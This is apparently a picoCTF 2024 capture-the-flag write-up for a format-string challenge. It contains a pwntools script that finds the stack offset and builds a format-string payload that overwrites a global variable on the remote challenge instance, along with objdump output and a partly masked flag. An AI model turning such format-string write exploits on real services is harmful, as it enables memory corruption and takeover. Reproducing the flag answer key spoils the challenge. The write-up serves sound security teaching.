# Description

This program is not impressed by cheap parlor tricks <br>
like reading arbitrary data off the stack. To impress this <br>
program you must change data on the stack! <br>
Download the binary here. <br>
Download the source here. <br>
Connect with the challenge instance here: <br>
nc rhea.picoctf.net 64167

# Solution

Here is a better formatted version of this writeup on [picoCTF Solutions website](https://picoctfsolutions.com/picoctf-2024-format-string-2).

To get the files use this command: `wget https://artifacts.picoctf.net/c_rhea/15/vuln https://artifacts.picoctf.net/c_rhea/15/vuln.c`

The hint mentioned using pwntools would be very useful for this challenge which led to finding the [pwntools documentation for solving exactly this problem](https://docs.pwntools.com/en/stable/fmtstr.html).


Script:
```
from pwn import *

context.log_level = "critical"
context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', 64167)

def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 64167)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)
```

This uses the exec_fmt, autofmt in the [documentation](https://docs.pwntools.com/en/stable/fmtstr.html) to find the offset for the payload. To find the address `objump -D vuln` was used on the binary executable file. When searching for the function "sus" these lines could be seen.

```
  401273:	8b 05 e7 2d 00 00    	mov    0x2de7(%rip),%eax        # 404060 <sus>
  401279:	3d 66 6c 61 67       	cmp    $0x67616c66,%eax
```

The address of sus is `0x404060` and `0x67616c66` for the cmp right below. By following the pwntools documentation the payload was constructed with this data and sent to the program. After receiving the output given after sending this payload the flag is received.

Flag: `picoCTF{f0rm47_57r?_f0rm47_m3m_99...}`
